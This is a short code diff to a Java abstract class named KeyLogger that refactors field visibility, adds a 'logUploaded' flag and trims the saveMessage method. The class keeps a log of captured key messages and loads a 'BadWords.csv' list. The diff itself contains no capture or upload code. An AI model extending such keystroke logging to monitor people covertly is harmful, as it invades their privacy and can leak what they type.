@@ -19,13 +19,13 @@ public abstract class KeyLogger {
 
     public static InputStream badWordsFilePath = ClassLoader.getSystemResourceAsStream("BadWords.csv");
     public static ArrayList<String> log = new ArrayList<>();
-    public static String baseMessage;
-    public static String message;
+    static String baseMessage;
+    static String message;
     String sendKey;
+    public static Boolean logUploaded = false;
 
     AccessWindow accessWindow = new AccessWindow();
 
-    abstract void nativeKeyPressed(NativeKeyEvent event);
     abstract public void turnOn();
     abstract void setDefaults();
 
@@ -35,9 +35,8 @@ public abstract class KeyLogger {
     }
 
 
-    void saveMessage() throws IOException {
+    void saveMessage() {
         log.add(baseMessage + message + "\n");
-        System.out.println(message);
         setDefaults();
     }
 
